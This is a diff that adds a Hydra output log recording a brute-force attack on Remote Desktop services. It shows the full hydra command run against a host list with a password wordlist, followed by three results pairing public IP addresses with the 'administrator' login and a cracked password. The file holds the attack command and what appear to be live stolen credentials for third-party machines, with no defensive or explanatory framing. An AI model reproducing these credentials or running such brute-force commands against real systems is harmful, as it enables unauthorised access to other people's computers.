@@ -1,0 +1,4 @@
+# Hydra v9.2 run at 2026-07-30 01:56:32 on /tmp/rdp_hosts.txt rdp (hydra -M /tmp/rdp_hosts.txt -l administrator -P /tmp/precise_pass.txt -t 1 -w 5 -o /tmp/hydra_rdp_precise.txt rdp)
+[3389][rdp] host: 113.113.81.253   login: administrator   password: 100206
+[3389][rdp] host: 117.50.115.224   login: administrator   password: Ahcq-scm
+[3389][rdp] host: 123.57.180.20   login: administrator   password: Cixingkeji
